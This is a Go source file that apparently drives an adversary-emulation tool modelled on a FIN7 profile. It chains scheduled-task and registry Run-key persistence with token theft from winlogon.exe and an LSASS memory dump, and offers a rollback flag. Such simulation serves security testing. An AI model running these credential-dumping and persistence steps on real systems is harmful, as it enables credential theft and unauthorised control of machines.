// cmd/sim is a developer reference showing how to compose a Sim inline in Go.
//
// For production use, build a lean binary with the operator-side TUI:
//
//	go build -o builder ./cmd/builder
//	./builder --profile profiles/fin7.yaml --output sim.exe
//
// The resulting sim.exe contains only the selected techniques, accepts only
// --rollback, and has no profile/dry-run flags.
//
// This file is a code example; it is NOT the binary you deploy.
//
// Build (Windows):
//
//	GOOS=windows GOARCH=amd64 go build -o sim-dev.exe ./cmd/sim
//go:build windows

package main

import (
	"flag"
	"log"
	"time"

	"github.com/rankin2000/golangexamples/pkg/creds"
	"github.com/rankin2000/golangexamples/pkg/persistence"
	"github.com/rankin2000/golangexamples/pkg/sim"
	"github.com/rankin2000/golangexamples/pkg/tokens"
)

func main() {
	rollback := flag.Bool("rollback", false, "undo all installed persistence")
	flag.Parse()

	s := sim.New().
		AddPhase("Persistence", 5*time.Second,
			&persistence.SchTask{
				PayloadPath: `C:\Temp\payload.exe`,
				UseXML:      true,
			},
			&persistence.RegistryRunKey{
				Hive:        persistence.HKCU,
				PayloadPath: `C:\Temp\payload.exe`,
			},
		).
		AddPhase("Post-Exploitation", 0,
			&tokens.Steal{
				TargetExe:     "winlogon.exe",
				SpawnExe:      `C:\Windows\System32\cmd.exe`,
				EnableSeDebug: true,
			},
			&creds.LSASSDump{
				OutputPath:    `C:\Temp\lsass.dmp`,
				EnableSeDebug: true,
			},
		)

	if *rollback {
		if err := s.Rollback(); err != nil {
			log.Fatalf("[-] rollback: %v", err)
		}
		log.Println("[+] rollback complete")
		return
	}

	log.Println("[*] execution plan:")
	for _, line := range s.Plan() {
		log.Println("   ", line)
	}

	if err := s.Run(); err != nil {
		log.Fatalf("[-] sim: %v", err)
	}
}
